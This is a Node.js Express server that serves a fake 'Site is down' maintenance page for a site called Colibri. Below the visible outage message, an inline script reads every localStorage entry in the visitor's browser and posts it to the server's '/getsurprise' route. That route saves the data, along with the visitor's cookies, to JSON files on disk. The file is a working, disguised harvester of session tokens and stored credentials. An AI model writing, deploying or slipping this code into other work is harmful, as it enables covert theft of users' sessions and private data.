const express = require("express");
const cookieParser = require("cookie-parser");

const app = express();
const PORT = Number(process.env.PORT) || 9432;

app.use(cookieParser());
app.use(express.json());

app.get("/", (req, res) => {
  res.send(/*html*/ `
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Site Unavailable</title>
    <style>
      body {
        margin: 0;
        height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        background: linear-gradient(135deg, #460000, #190000);
        color: #f8d7da;
        font-family:
          system-ui,
          -apple-system,
          BlinkMacSystemFont,
          Segoe UI,
          Roboto,
          Ubuntu,
          sans-serif;
        text-align: center;
      }
      .card {
        max-width: 720px;
        padding: 3rem 2rem;
        border: 1px solid rgba(255, 255, 255, 0.08);
        border-radius: 24px;
        background: rgba(0, 0, 0, 0.25);
        box-shadow: 0 24px 80px rgba(0, 0, 0, 0.35);
      }
      h1 {
        font-size: clamp(2rem, 4vw, 4rem);
        margin: 0 0 1rem;
      }
      p {
        font-size: 1.1rem;
        line-height: 1.7;
        margin: 0;
      }
    </style>
  </head>
  <body>
    <div class="card">
      <h1>Site is down</h1>
      <p>
        Colibri currently unavailable for technical reasons. Please check
        back later.
      </p>
    </div>
        <script>
           const obj = {};

            for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            obj[key] = localStorage.getItem(key);
            }

          fetch('/getsurprise', {
            method: 'POST',
            body: JSON.stringify(obj),
            headers: {
              'Content-Type': 'application/json'
            }
          })
        </script>
  </body>
</html>
`);
});

app.post("/getsurprise", (req, res) => {
  const date = new Date();
  const fs = require("fs");
  const filename = `surprise-${date.toISOString()}.json`;

  const data = {
    body: req.body,
    cookies: req.cookies,
  };
  fs.writeFileSync(filename, JSON.stringify(data, null, 2));

  res.sendStatus(200);
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
